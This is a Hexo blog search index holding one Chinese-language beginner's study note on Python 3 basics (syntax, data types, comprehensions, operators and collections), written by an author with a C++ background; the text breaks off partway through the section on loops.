<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Python noob</title>
    <link href="/2022/03/23/Python-noob/"/>
    <url>/2022/03/23/Python-noob/</url>
    
    <content type="html"><![CDATA[<h1 id="Python-学习之路"><a href="#Python-学习之路" class="headerlink" title="Python 学习之路"></a>Python 学习之路</h1><p>笔者有C++基础，但在Python上还是noob一只。</p><h2 id="0x00-Python3-初见"><a href="#0x00-Python3-初见" class="headerlink" title="0x00 Python3 初见"></a>0x00 Python3 初见</h2><h3 id="Python是一种解释型语言"><a href="#Python是一种解释型语言" class="headerlink" title="Python是一种解释型语言"></a>Python是一种解释型语言</h3><p>与C语言对比，Python无需编译，而是执行时，通过解释器一行一行地进行解释。  </p><h3 id="Python是面向对象的语言"><a href="#Python是面向对象的语言" class="headerlink" title="Python是面向对象的语言"></a>Python是面向对象的语言</h3><p>与C++一样。  </p><h3 id="可拓展性"><a href="#可拓展性" class="headerlink" title="可拓展性"></a>可拓展性</h3><blockquote><p>如果你需要一段运行很快的关键代码，或者是想要编写一些不愿开放的算法，你可以使用C或C++完成那部分程序，然后从你的Python程序中调用。  </p></blockquote><h3 id="可嵌入性"><a href="#可嵌入性" class="headerlink" title="可嵌入性"></a>可嵌入性</h3><blockquote><p>你可以将Python嵌入到C/C++程序，让你的程序的用户获得”脚本化”的能力。</p></blockquote><h3 id="速度性能"><a href="#速度性能" class="headerlink" title="速度性能"></a>速度性能</h3><blockquote><p>若想程序运行得更快，用C++改写关键部分</p></blockquote><h2 id="0x01-Python3-环境配置"><a href="#0x01-Python3-环境配置" class="headerlink" title="0x01 Python3 环境配置"></a>0x01 Python3 环境配置</h2><h3 id="安装Python环境"><a href="#安装Python环境" class="headerlink" title="安装Python环境"></a>安装Python环境</h3><blockquote><p><a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a><br>下载Download Windows installer (64-bit)<br>记得勾选add path选项。</p></blockquote><h3 id="Pycharm-运行Python"><a href="#Pycharm-运行Python" class="headerlink" title="Pycharm 运行Python"></a>Pycharm 运行Python</h3><blockquote><p><a href="https://www.jetbrains.com/pycharm/download/">https://www.jetbrains.com/pycharm/download/</a><br>下载Pycharm</p></blockquote><h2 id="0x02-Python3-基础语法"><a href="#0x02-Python3-基础语法" class="headerlink" title="0x02 Python3 基础语法"></a>0x02 Python3 基础语法</h2><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>默认utf-8编码，unicode字符串。</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p><strong>第一个字符不能是数字，只能是字母表中字母或下划线_</strong><br>其余与C++相同。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>以#开头，如</p><blockquote><p>#this is my file</p></blockquote><p>也可以用”””或’’’</p><blockquote><p>‘’’<br>注释<br>注释<br>‘’’</p><p>“””<br>注释<br>注释<br>“””</p></blockquote><h3 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h3><p>python最具特色的就是用缩进表示代码块，不要用大括号{}<br>缩进空格数可变，但同一个代码块必须包含相同的缩进空格数。</p><blockquote><p>if True:<br>          print(“true”)<br>          print(“1111”)<br>else:<br>          print(“false”)</p><p>#the following part will not be allowed<br>if True:<br>          print(“111”)<br>          print(“not allowed”)</p></blockquote><h3 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h3><p>Python可以用\实现多行语句</p><blockquote><p>total = item_one + <br>               item_two + <br>               item_three</p><p>在[], {} , ()中的多行语句，不需要\ 如：<br>total = {‘it’,’it3’<br>     ‘it2’}</p></blockquote><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>Python中有四种类型：整形，bool，float，复数。</p><blockquote><p>int (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。<br>bool (布尔), 如 True。<br>float (浮点数), 如 1.23、3E-2<br>complex (复数), 如 1 + 2j、 1.1 + 2.2j</p></blockquote><p>注：float型中，如1.23，3E-2.<br>3E-2是3*10的负二次方的意思。</p><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><p>** Python中单引号<code>&#39;&#39;</code>与双引号<code>&quot;&quot;</code>的使用完全相同</p><p>转义符<code>\</code>.<br>使用r让反斜杠不转义。如 <strong>r”this is line of words\n”</strong> 此时<code>\n</code>会显示，而非换行。</p><p>字符串可用<code>+</code>链接，用<code>*</code>重复数次。<br>Python中字符串有两种索引方式，从左往右以<code>0</code>开始，从右往左以<code>-1</code>开始。<br>Python 中的字符串不能改变。<br>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。<br>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong><br><strong>关于Python字符串的下标，跟C++有出入</strong></p><blockquote><p>a= “123456”<br>print(a[0:1])<br>#会打印1<br>print(a[0:0])<br>#什么都不会打印出来</p></blockquote><h3 id="等待用户输入"><a href="#等待用户输入" class="headerlink" title="等待用户输入"></a>等待用户输入</h3><p>执行下面程序，会在回车键后等待用户输入</p><blockquote><p>input(“按下 enter 键后退出”)</p></blockquote><h3 id="同一行显示多条语句"><a href="#同一行显示多条语句" class="headerlink" title="同一行显示多条语句"></a>同一行显示多条语句</h3><p>语句间用<code>;</code>分割。</p><blockquote><p>import sys; x = ‘runoob’; sys.stdout.write(x + ‘\n’)</p></blockquote><h3 id="代码组"><a href="#代码组" class="headerlink" title="代码组"></a>代码组</h3><p>缩进相同的一组语句构成一个代码块，称之为代码组。<br>如if，while，def这种复合语句，首行以<code>:</code>结束，此行开始后的一行或多行构成代码组。</p><h3 id="print输出"><a href="#print输出" class="headerlink" title="print输出"></a>print输出</h3><p><strong>print</strong>输出是默认换行的，若要禁止换行，需要在print第二个参数写上<code>end = &quot;&quot;</code></p><blockquote><p>x= “a”<br>y = “b”<br>#换行<br>print(x)<br>#不换行<br>print(y,end = “”)<br>print()</p></blockquote><h3 id="import-与-from-import"><a href="#import-与-from-import" class="headerlink" title="import 与 from  import"></a>import 与 from  import</h3><p>导入整个模块，格式为：import somemodule<br>导入某模块中全部函数：from pwn import*<br>（导入pwntools的所有函数）<br>从模块中导入函数：from somemodule import func1，func2</p><h2 id="0x03-Python3-基本数据类型"><a href="#0x03-Python3-基本数据类型" class="headerlink" title="0x03 Python3 基本数据类型"></a>0x03 Python3 基本数据类型</h2><p>python中变量不需要声明类型（与C++不同）<br><del>所以</del>每个变量使用前都必须赋值，才能创建。<br><code>=</code>为赋值号，如<code>a = 1</code>就是给变量a赋值为1，a是整型变量。</p><h3 id="多变量赋值"><a href="#多变量赋值" class="headerlink" title="多变量赋值"></a>多变量赋值</h3><p>规则：从后向前。<br>如</p><blockquote><p>a = b = c = 1</p></blockquote><p>就是c先被赋值为1，再b、a。  </p><p>也可以对应式多变量赋值。</p><blockquote><p>a, b, c = 1, 2, “new booob”</p></blockquote><p>就是a = 1;b = 2; c = “new booob”的效果。  </p><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><p>Python3 中有六个标准数据类型：</p><ol><li>Number（数字）</li><li>String （字符串）</li><li>List （列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ol><p>Python3的六个标准数据类型中：<br>Number，String，Tuple   为不可变数据。<br>List，Dictionary，Set   为可变数据。</p><h3 id="Number详解"><a href="#Number详解" class="headerlink" title="Number详解"></a>Number详解</h3><p><strong>int,float,bool,complex.</strong><br>注：内置type()函数可以查询变量所指对象类型</p><blockquote><p>&gt;&gt;&gt; a, b, c, d = 20, 5.5, True, 4+3j<br>&gt;&gt;&gt; print(type(a), type(b), type(c), type(d))<br>&lt;class ‘int’&gt; &lt;class ‘float’&gt; &lt;class ‘bool’&gt; &lt;class ‘complex’&gt;</p></blockquote><p>注：<code>//</code>双除号会得到一个整数（仅仅保留整数部分，如1.9保留为1）<br>一个变量可以通过赋值指向不同类型的对象。<br>混合计算时，Python会将整型转化为浮点数。</p><h3 id="String字符串"><a href="#String字符串" class="headerlink" title="String字符串"></a>String字符串</h3><p>截取：</p><blockquote><p>变量[头下标:尾下标]</p></blockquote><p><img src="/2022/03/23/Python-noob/p1.svg"></p><p>可见，其与C++的索引模式有点区别，小心搞混力。<br><strong>与C字符串不同的是，Python字符串不能被改变。对一个索引位置赋值是错误的！！</strong><br><strong>w[0]就会报错</strong></p><p>总结：<br>1、反斜杠可以用来转义，使用r可以让反斜杠不发生转义。<br>2、字符串可以用+运算符连接在一起，用*运算符重复。<br>3、Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。<br>4、Python中的字符串不能改变。</p><h3 id="List-（列表）"><a href="#List-（列表）" class="headerlink" title="List （列表）"></a>List （列表）</h3><p>List（列表）是Python中使用最频繁的数据类型。<br>可以看作一个混合数组，其中各个元素类型可以互不相同。<br>创建方式</p><blockquote><p>list1 = [“a”, 100 , 12.5, b]</p><p>列表的截取语法与字符串相同：<br>变量[头下标:尾下标]     </p></blockquote><p><img src="/2022/03/23/Python-noob/p2"></p><blockquote><p>print(list1[0])     #输出列表第一个元素<br>print(list1[1:3])  #输出列表第2，3个元素<br>print(list1[1:])   #输出列表第二个元素开始的所有元素</p></blockquote><p>注：列表也是可以链接的。</p><p>与Python字符串不同，列表中元素可以改变</p><p><strong>索引的理解方式</strong>：<br>与C++一样的部分：从0号元素开始。<br>不同：左闭右开，即[start_index:end_index]中，start_index是取得到的，end_index是取不到的</p><p><strong>如[1:3]就是位置为1，第二个元素会取到，但位置为3，第四个元素不会取到，也就是对第2到3，这两个元素进行操作！！！</strong></p><p>总结：<br>1、List写在方括号之间，元素用逗号隔开。<br>2、和字符串一样，list可以被索引和切片。<br>3、List可以使用+操作符进行拼接。<br>4、List中的元素是可以改变的。</p><h3 id="Tuple-（元组）"><a href="#Tuple-（元组）" class="headerlink" title="Tuple （元组）"></a>Tuple （元组）</h3><p>元组与列表相似，不同之处在于元组的元素<strong>不能修改</strong>。<br>元组写在小括号<code>()</code>内，元素之间用逗号分割。</p><blockquote><p>tup = (1,2,3,4,5)#Tuple<br>list1 = [1,2,3,4,5]#List</p></blockquote><p>虽然tuple元素不可修改，但是它可以包含可变的对象，如list列表。<br><img src="/2022/03/23/Python-noob/p3.png" alt="可见，元组中list的元素可以被修改"><br>当构造包含0个或1个元素的元组时，有额外的语法规则：</p><blockquote><p>tup0 = ()<br>tup1 = (1,)#一个元素，要在元素后面打逗号</p></blockquote><p>string，list，tuple都属于sequence（序列）。</p><p>总结：</p><p>1、与字符串一样，元组的元素不能修改。<br>2、元组也可以被索引和切片，方法一样。<br>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。<br>4、元组也可以使用+操作符进行拼接。</p><h3 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h3><p>集合时由一个或数个形态各异的大小整体组成，构成集合的事物或对象，称为元素或成员。<br>可以使用大括号 <code>&#123;&#125;</code>或set()来创建集合。<br>注意：空集合必须用set()<br><code>parame = &#123;calue1, value2,....&#125; or set(value)</code><br>当输出集合时，会自动不输出重复的元素。<br>也可以测试集合中是否有某一元素。<br><code>sites = &#123;&quot;baidu&quot;,&quot;google&quot;&#125; if &quot;baidu&quot; in sites :         print(&quot;baidu is in sites&quot;) else :         print(&quot;baidu is not in sites&quot;)</code><br>set还能进行集合运算：<br><code>a = set(&#39;abracadabra&#39;) b = set(&#39;alacazam&#39;) print(a - b)  #a 和 b 的差集，a中有而b中无 print(a | b)  #a和b的并集 print(a &amp; b)  #a 和 b 的交集 print(a ^ b)   #a 和 b中不同时存在的元素（异或符号）</code></p><p><strong>只有a = set()格式才能进行集合运算，输出形式为一个字符一个字符地，而且去除了相同的字符。而a = {“google”,…}形式为括号内每一个元素之间进行运算。</strong></p><h3 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h3><p>字典是一个非常有用的内置数据类型。<br>字典是一种映射类型，它的元素是键(key)与值(value)对。<br><strong>同一个字典内，键(key)必须是唯一的。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">dict</span> = &#123;&#125; <span class="hljs-comment">#create an empty dictionary</span><br><span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;one&#x27;</span>] = <span class="hljs-string">&quot;1-runoob&quot;</span>  <span class="hljs-comment">#bind &quot;1-runoob&quot;(value) to &#x27;one&#x27;(key)</span><br><span class="hljs-built_in">dict</span>[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;2-fc&quot;</span>  <span class="hljs-comment">#bind &quot;2-fc&quot; to 2 (in this dictionary called dict)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>[<span class="hljs-string">&#x27;one&#x27;</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dict</span>[<span class="hljs-number">2</span>]) <br><br>tinydict = &#123;<span class="hljs-string">&quot;fc&quot;</span> : <span class="hljs-string">&quot;noob&quot;</span> , <span class="hljs-string">&quot;kawa&quot;</span> : <span class="hljs-string">&quot;pro&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(tinydict) <span class="hljs-comment">#print all members in tinydict</span><br><span class="hljs-built_in">print</span>(tinydict.keys()) <span class="hljs-comment">#print all keys in tinydict</span><br><span class="hljs-built_in">print</span>(tinydict.values()) <span class="hljs-comment">#print all values in tinydict</span><br></code></pre></td></tr></table></figure><p>注意：当创造如上tinydict后，可以用<code>tinydict[&quot;xx&quot;] = &quot;xxx&quot;</code>的语法扩充字典。</p><p>1、字典是一种映射类型，它的元素是键值对。<br>2、字典的关键字必须为不可变类型，且不能重复。<br>3、创建空字典使用 { }。</p><h2 id="0x04-Python3-数据类型转换"><a href="#0x04-Python3-数据类型转换" class="headerlink" title="0x04 Python3 数据类型转换"></a>0x04 Python3 数据类型转换</h2><p>Python中数据类型转换可以分为两种：<br>1.隐式类型转换 — 自动完成<br>2.显式类型转换 — 需要用函数进行转换</p><h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>如int类型与float类型进行运算，python会自动将int类型数据升级为float类型，防止数据丢失。<br><strong>但是int，float无法自动与str类型自动转换。</strong><br><strong>此时需要强制类型转换</strong></p><h3 id="显式类型转换"><a href="#显式类型转换" class="headerlink" title="显式类型转换"></a>显式类型转换</h3><p>将目标数据类型作为函数名，进行转换，<strong>记得要用一个变量接受函数返回值</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">1</span><br>y = <span class="hljs-string">&quot;123&quot;</span><br>y = <span class="hljs-built_in">int</span>(y) <span class="hljs-comment">#switch y--str to y--int, y is 123(int) now</span><br><span class="hljs-built_in">print</span>(x+y) <span class="hljs-comment">#it will print 124 as result</span><br></code></pre></td></tr></table></figure><h2 id="0x05-Python3-推导式"><a href="#0x05-Python3-推导式" class="headerlink" title="0x05 Python3 推导式"></a>0x05 Python3 推导式</h2><p>推导式可以理解为，用循环的方式，予以一定的条件限制，快速建立一个新的List，Tuple，Set，Dictionary。</p><h3 id="List推导式"><a href="#List推导式" class="headerlink" title="List推导式"></a>List推导式</h3><p>先回忆一下List结构：<br>是一个可以存储各种数据类型的数组，用[]建立。</p><p>列表推导式格式为：</p><blockquote><p>[表达式 <strong>for</strong> 变量 <strong>in</strong> 列表]<br>[out_exp_res <strong>for</strong> out_exp <strong>in</strong> input_list]<br>[表达式 <strong>for</strong> 变量 <strong>in</strong> 列表 <strong>if</strong> condition]</p></blockquote><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">names = [<span class="hljs-string">&quot;kawasan&quot;</span>,<span class="hljs-string">&quot;alice&quot;</span>,<span class="hljs-string">&quot;bob&quot;</span>,<span class="hljs-string">&quot;peter&quot;</span>]<br>new_names = [name <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">3</span>]<br><span class="hljs-built_in">print</span>(new_names)<br></code></pre></td></tr></table></figure><p>通过上面例子，可见，[]中：<br>第一个参数，是写入新List的数据，可以用函数返回值修饰<br>第二个参数是引用的变量名，自己命名，在本[]中有效（作用域为本括号，就是起名字的作用）<br>第三个参数为导入的List，也就是引入的源数据列表。<br>第四个为条件参数，满足条件则往新List中push第一个参数值。<br><strong>可见表达式十分的简洁，笔者认为这正是Python的魅力所在</strong></p><h3 id="字典推导式"><a href="#字典推导式" class="headerlink" title="字典推导式"></a>字典推导式</h3><p>复习一下字典这个数据类型的概念：<br>是一个映射型的数据类型，字典里面的元素是key与value的数据对。用大括号表示。<br>字典推导式的格式为：</p><blockquote><p>[key : value_expr for value in input if condition]</p></blockquote><p>注意：可以传入List类型</p><p><strong>关于遍历字典的方法</strong><br>默认情况下：</p><blockquote><p>for key in dict1</p></blockquote><p>是遍历字典的key值<br>如果想遍历字典的value：</p><blockquote><p>for value in dict1.values()</p></blockquote><p>如果想遍历字典的items</p><blockquote><p>for key,value in dict1.items()</p></blockquote><p><del>感谢{“daisan”:”pro”}的鼎力相助</del></p><h3 id="集合推导式"><a href="#集合推导式" class="headerlink" title="集合推导式"></a>集合推导式</h3><p>回忆一下集合的定义：<br>集合用大括号<code>&#123;&#125;</code>表示，集合与List相比，可以用set()方法进行集合运算。  </p><p>集合推导式如下：</p><blockquote><p>new_set = {new_it for new_it in former_set if condition}</p></blockquote><h3 id="元组推导式"><a href="#元组推导式" class="headerlink" title="元组推导式"></a>元组推导式</h3><p>元组：<br>不能修改元素值的列表，用小括号<code>()</code>表示</p><blockquote><p>new_tuple = (item for item in former_tuple if condition)</p></blockquote><p>至此，推导式列举得差不多了，稍稍总结一下：<br>推导式就是快速简单，用循环和条件创建一个新的数据结构的表达式。<br>注意符合目标数据结构的格式，灵活运用循环，就能写出来。</p><h2 id="0x06-Python3-解释器"><a href="#0x06-Python3-解释器" class="headerlink" title="0x06 Python3 解释器"></a>0x06 Python3 解释器</h2><h2 id="0x07-Python3-注释"><a href="#0x07-Python3-注释" class="headerlink" title="0x07 Python3 注释"></a>0x07 Python3 注释</h2><p>单行：用<code>#</code><br>多行：用<code>&#39;&#39;&#39;</code>或<code>&quot;&quot;&quot;</code>括起来。</p><h2 id="0x08-Python3-运算符"><a href="#0x08-Python3-运算符" class="headerlink" title="0x08 Python3 运算符"></a>0x08 Python3 运算符</h2><p>与C++不同部分：<br>1.<code>**</code>幂运算符，如2**2 = 4。<br>2.<code>//</code>除取整数部分运算符。<br>3.按位运算符，将数字先看作二进制，再进行计算。<br>&amp;：和运算符，同一位，都为1，&amp;值为1，否则为0<br>|：或运算符，同一位，有1则为1，否则为0<br>^：异或运算符，同0异1<br>~：取反，单操作数运算符，所有位取反。<br>&lt;&lt;：左移运算符：向左移动，高位丢弃，低位填0</p><blockquote><blockquote><p>：右移运算符：向右移动。</p></blockquote></blockquote><p>逻辑运算符：and，or，not<br>返回bool类型返回值。<br><strong>这里的逻辑十分有趣</strong><br>and：表达式：x and y  ：如果x为false，返回x值，否则返回y值<br>or ： 表达式 x or y ： 如果x为true，返回x值，否则返回y值<br>not就不用说了0.0</p><h3 id="Python-成员运算符"><a href="#Python-成员运算符" class="headerlink" title="Python 成员运算符"></a>Python 成员运算符</h3><p>in：如果在指定的sequence中找到了，返回true，没找到就是false。<br>not in：与in相反。</p><h3 id="Python-身份运算符"><a href="#Python-身份运算符" class="headerlink" title="Python 身份运算符"></a>Python 身份运算符</h3><p>is：x is y   ：类似id(x) == id(y),如果引用的是同一个对象返回True，反之为false。</p><p><strong>注</strong>：<br>id()函数用于获取对象内存地址。</p><h2 id="0x09-Python3-数字（Number）"><a href="#0x09-Python3-数字（Number）" class="headerlink" title="0x09 Python3 数字（Number）"></a>0x09 Python3 数字（Number）</h2><p>删除方式：del关键字。<br>部分数学函数：</p><blockquote><p>abs(x) #返回绝对值<br>exp(x) #返回e的x次幂 需要import math，用math.exp(x)方式调用<br>max(x1,x2,….)或max(sequence)，sequece可以是一个List，纯数字组成的List<br>log(100,10)就是以10为底，100为真数，同样需要math方法<br>sqrt(x) #返回平方根</p></blockquote><h3 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h3><p><strong>需要import random， 随后用random.func()方式调用</strong></p><p>randrange(start,stop,step) # 在范围内，以一定步长随机获取一个数<br>random() # 随机生成一个实数，在范围[0,1)之间。<br>uniform(x,y) # 随机生成一个实数，在[x,y]之间。</p><h2 id="0x10-Python3-字符串"><a href="#0x10-Python3-字符串" class="headerlink" title="0x10 Python3 字符串"></a>0x10 Python3 字符串</h2><p>转义符：<code>\</code><br>\xyy：为十六进制数，以\x开头，\x0a 代表换行。</p><h3 id="Python-字符串运算符"><a href="#Python-字符串运算符" class="headerlink" title="Python 字符串运算符"></a>Python 字符串运算符</h3><p>in ： 成员运算符，可以判断字符串中包含给定的字符与否，返回bool类型。<br>此处，给定字符可以是字符串，in会判断有无子串(substr)。<br>r ： 保留原始字符串，直接按照引号内内容打印。无视一切转义。</p><p>类似printf的函数写法：</p><blockquote><p>print (“我叫 %s 今年 %d 岁!” % (‘小明’, 10))</p></blockquote><p><strong>注意</strong>：<br>此处两块直接链接符为<code>%</code>，后面内容需要用括号括起来。</p><h2 id="0x11-Python3-列表"><a href="#0x11-Python3-列表" class="headerlink" title="0x11 Python3 列表"></a>0x11 Python3 列表</h2><p>1.列表用中括号表示。<br>2.可以用索引访问列表。</p><h3 id="更新列表"><a href="#更新列表" class="headerlink" title="更新列表"></a>更新列表</h3><p>可以直接对列表各项进行修改。</p><p>也可以用append()方法来添加列表项。</p><blockquote><p>list1 = [‘baidu’,’taobao’,’fc’,’zhihu’]<br>list1.append(‘kawa’)<br>print(“更新后的列表”,list1)</p></blockquote><h3 id="删除列表元素"><a href="#删除列表元素" class="headerlink" title="删除列表元素"></a>删除列表元素</h3><p>可以用del语句来删除列表中的元素</p><blockquote><p>list = [‘fc’,’kawa’,’stupid’]<br>del list[0]  #delete the first element in list</p></blockquote><p>可以用len()函数对list取值，返回值为list内element的个数。<br>可以用<code>+</code>进行列表的拼接。<br>可以用<code>*</code>进行列表的重复。</p><h3 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h3><p>列表可以嵌套，即将一个列表归为另一个列表的元素。</p><h3 id="Python-列表函数-amp-方法"><a href="#Python-列表函数-amp-方法" class="headerlink" title="Python 列表函数&amp;方法"></a>Python 列表函数&amp;方法</h3><ol><li>len(list)</li><li>max(list) #返回列表最大值</li><li>min(list)</li><li>list(tuple)  #<strong>将元组转换为列表</strong></li></ol><p>方法：(成员函数一样地使用,例如list.append())</p><ol><li>append(obj) #add an element into list</li><li>count(obj) #统计某元素出现的次数</li><li>index(obj) #寻找某个值在列表中第一次出现的位置</li><li>insert(index,obj)</li><li>remove(obj) #移除某元素在列表中的第一次出现</li><li>reverse() #reverse</li><li>list.sort(key = None, reverse = False) #第一个参数是指定用谁排序，例如字典里面的key<br>第二个参数是是否逆向排序（默认升序）<blockquote><p>例如：<br>list = [1,4,7,3]<br>list.sort(reverse = False)<br>#[1, 3, 4, 7]</p></blockquote></li></ol><h2 id="0x12-Python3-元组"><a href="#0x12-Python3-元组" class="headerlink" title="0x12 Python3 元组"></a>0x12 Python3 元组</h2><p><strong>元组位于小括号内</strong><br><strong>元组与列表相似，但是元组不能被修改</strong><br>元组中仅包含一个元素时，需要在括号内结尾处添加逗号<code>,</code>，否则括号会被视为运算符</p><h3 id="修改元组"><a href="#修改元组" class="headerlink" title="修改元组"></a>修改元组</h3><p>元组中元素值不允许修改，但是可以对元组进行链接组合。<br>使用<code>+</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tup1 = (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br>tup2 = (<span class="hljs-string">&#x27;fc&#x27;</span>,<span class="hljs-string">&#x27;kawa&#x27;</span>,<span class="hljs-string">&#x27;suki&#x27;</span>)<br>tup3 = tup1 + tup2 <span class="hljs-comment">#tup3 = (1,2,3,&#x27;fc&#x27;,&#x27;kawa&#x27;,&#x27;suki&#x27;)</span><br></code></pre></td></tr></table></figure><h3 id="删除元组"><a href="#删除元组" class="headerlink" title="删除元组"></a>删除元组</h3><p>删除单独元素是不允许的，但是可以del删除整个元组。</p><h2 id="0x13-Python3-字典"><a href="#0x13-Python3-字典" class="headerlink" title="0x13 Python3 字典"></a>0x13 Python3 字典</h2><p>字典是映射型的数据结构，每个key对应一个value，key之间不能重名，但value之间没有限制。<br>整个字典用花括号包围。<br>key与value之间用<code>:</code>分割，items之间用<code>,</code>分割</p><p>注意：<code>dict</code>作为Python的内置函数与关键字，尽量不用dict作为变量名。<br><strong>关于键是不可变的</strong><br>如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;fc&#x27;</span><br>d = &#123;a:<span class="hljs-string">&#x27;111&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>:<span class="hljs-string">&#x27;pro&#x27;</span>&#125;<br><br><span class="hljs-built_in">print</span>(d[<span class="hljs-string">&#x27;fc&#x27;</span>])<br>a = <span class="hljs-string">&#x27;zz&#x27;</span><br><span class="hljs-built_in">print</span>(d[<span class="hljs-string">&#x27;fc&#x27;</span>])<br></code></pre></td></tr></table></figure><p>可以输出两次‘111’<br>但是若将第二次print内的‘fc’改为‘zz’，则报错，改为a，也报错，显示‘zz’不是key<br>可见，字典创造时是单次绑定，直接选取变量对应的常量进行一次绑定。<br>所以如果键是不可变的。</p><h3 id="创建空字典"><a href="#创建空字典" class="headerlink" title="创建空字典"></a>创建空字典</h3><blockquote><p>dicts = {}</p></blockquote><p>可以创建一个空字典。</p><p>用内建函数dict()创造字典。<br>如</p><blockquote><p>dicts = dict()</p></blockquote><p>上面就创建了一个空字典</p><h3 id="删除字典中元素"><a href="#删除字典中元素" class="headerlink" title="删除字典中元素"></a>删除字典中元素</h3><p>del dicts[key]<br>删除键就可以。<br><strong>键可以是元组，但是不可以是list</strong></p><h3 id="字典的内置函数与方法"><a href="#字典的内置函数与方法" class="headerlink" title="字典的内置函数与方法"></a>字典的内置函数与方法</h3><p>函数：</p><ol><li>len(dicts)</li></ol><p>方法：</p><ol><li>dicts.values()</li><li>dicts.keys()</li><li>dicts.items()</li></ol><h2 id="0x14-Python3-集合"><a href="#0x14-Python3-集合" class="headerlink" title="0x14 Python3 集合"></a>0x14 Python3 集合</h2><p>集合是用花括号表示，与字典不同是，不存在对。<br>可以用set()函数进行创建。<br>集合会自己删除重复的元素。</p><h3 id="集合的添加元素"><a href="#集合的添加元素" class="headerlink" title="集合的添加元素"></a>集合的添加元素</h3><blockquote><p>s.add(x) #不可以添加原本集合中元素种类以外的数据类型</p></blockquote><p>将x加入s中，若x已经存在，则不会进行任何操作。<br>s.update(x)也是可以的。且可以添加其它类型数据</p><h3 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h3><blockquote><p>s.remove(x)</p></blockquote><p>将x从s中移除。<br>若没有x元素，则会报错。<br>但是用s.discard(x)也可以，且不会报错。</p><p>s.pop()会随机删除一个元素。</p><p><strong>ok，基础知识了解了很多了，接下来是语句语法部分</strong></p><h2 id="0x15-Python3-部分语句记录"><a href="#0x15-Python3-部分语句记录" class="headerlink" title="0x15 Python3 部分语句记录"></a>0x15 Python3 部分语句记录</h2><p>仅记录下与C++区别较大的部分！</p><p>在Python中，else if不存在，而是<code>elif</code><br>故if语句流程为<br><code>if-elif-else</code><br><strong>注意</strong><br><strong>当条件满足第一次出现的condition后，就会进入语句，执行完后不再判断其他的condition，直接退出整个if语句。</strong><br>如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> a == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b == <span class="hljs-number">1</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1&quot;</span>)<br><span class="hljs-keyword">elif</span> a == <span class="hljs-number">1</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2&quot;</span>)<br></code></pre></td></tr></table></figure><p>以上代码中，只会打印1，不会打印2 。</p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><ol><li>while循环<blockquote><p>while condition:</p><div class="code-wrapper"><pre><code class="hljs">statements......</code></pre></div><p>while ……else……语句</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 